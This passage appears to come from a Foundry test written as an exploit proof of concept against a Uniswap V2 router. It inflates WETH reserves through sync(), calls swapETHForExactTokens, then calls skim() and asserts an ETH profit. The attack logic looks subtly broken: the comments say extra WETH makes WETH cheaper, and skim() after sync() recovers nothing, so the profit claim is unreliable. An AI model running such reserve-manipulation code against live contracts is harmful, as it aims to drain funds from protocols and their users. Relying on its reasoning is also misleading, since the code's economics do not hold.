        deal(weth, address(this), IERC20(weth).balanceOf(address(this)) + wethAmount);

        // Approve pair to transfer WETH (for skim later)
        IERC20(weth).approve(pair, wethAmount);

        // Transfer WETH to pair to increase WETH reserves
        IERC20(weth).transfer(pair, wethAmount);

        // Sync reserves
        IUniswapV2Pair(pair).sync();

        // Prepare swap path: WETH -> token
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(token);

        // We want to get 1 token out
        uint256 tokenAmountOut = 1 ether;

        // Send 1 ETH (should be more than needed with manipulated reserves)
        uint256 ethSent = 1 ether;

        // Execute swapETHForExactTokens
        IUniswapV2Router02(TARGET).swapETHForExactTokens{value: ethSent}(
            tokenAmountOut,
            path,
            address(this),
            block.timestamp + 1000
        );

        // With manipulated reserves (more WETH), WETH is cheaper
        // So router calculates we need very little ETH to get 1 token
        // Refunds most of our 1 ETH

        // Restore reserves: use pair's skim to get WETH back
        IUniswapV2Pair(pair).skim(address(this));

        // Check profit
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "ETH balance should increase");

        console.log("Initial ETH:", initialBalance);
        console.log("Final ETH:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
